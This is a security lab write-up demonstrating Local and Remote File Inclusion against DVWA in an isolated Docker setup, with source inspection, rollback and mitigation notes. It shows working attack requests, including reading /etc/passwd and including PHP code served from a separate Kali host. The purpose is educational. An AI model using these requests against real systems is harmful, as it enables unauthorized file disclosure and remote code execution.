# File Inclusion: LFI and RFI

## 1. Local File Inclusion (LFI)

### Objective

Test whether a user-controlled `page` parameter can force the application to include an unintended local file.

### Test

Set DVWA Security to **Low** and use:

```text
http://127.0.0.1:4280/vulnerabilities/fi/?page=/etc/passwd
```

The successful disclosure of `/etc/passwd` demonstrated Local File Inclusion.

### Source inspection

```bash
cd /root/DVWA
cat vulnerabilities/fi/source/low.php
```

The vulnerable flow accepts the `page` request parameter and passes the value into the inclusion logic used by the module.

## 2. Remote File Inclusion (RFI)

### Preparation

RFI was disabled in the container initially because:

```text
allow_url_fopen    = On
allow_url_include  = Off
```

For the isolated lab demonstration, URL-based inclusion was temporarily enabled with:

```bash
printf 'allow_url_include=On\n' > /usr/local/etc/php/conf.d/rfi-lab.ini
```

It was then verified with:

```bash
php -i | grep -E "allow_url_include|allow_url_fopen"
```

### Harmless remote test file

On Kali:

```bash
mkdir -p /tmp/rfi-web
printf '%s\n' '<?php echo "RFI_TEST_SUCCESS"; ?>' > /tmp/rfi-web/rfi-test.php
cat /tmp/rfi-web/rfi-test.php
```

The file was served from Kali with:

```bash
python3 -m http.server 8000 --bind 0.0.0.0 --directory /tmp/rfi-web
```

The Docker network gateway was determined with:

```bash
docker inspect -f '{{range .NetworkSettings.Networks}}{{.Gateway}}{{end}}' dvwa-dvwa-1
```

The gateway used in the lab was `172.18.0.1`.

Container connectivity was checked with:

```bash
docker exec -it dvwa-dvwa-1 php -r 'var_dump(file_get_contents("http://172.18.0.1:8000/rfi-test.php"));'
```

### RFI Demonstration

The vulnerable DVWA request was:

```text
http://127.0.0.1:4280/vulnerabilities/fi/?page=http://172.18.0.1:8000/rfi-test.php
```

A displayed `RFI_TEST_SUCCESS` marker demonstrated that the remotely hosted PHP code had been included and executed by the vulnerable server-side PHP process.

### Rollback

After the test, URL inclusion was disabled again:

```bash
rm /usr/local/etc/php/conf.d/rfi-lab.ini
apache2ctl -k graceful
php -i | grep -E "allow_url_include|allow_url_fopen"
```

The desired final state was `allow_url_fopen = On` and `allow_url_include = Off`.

## Mitigation Notes

Use an allowlist of permitted files/pages rather than accepting arbitrary paths from users. Avoid passing untrusted input directly to `include()`/`require()`. Disable URL-based includes unless there is a specific, justified requirement.

## References

- PHP Remote Files: https://www.php.net/manual/en/features.remote-files.php
- PHP include(): https://www.php.net/manual/en/function.include.php
- DVWA: https://github.com/digininja/DVWA
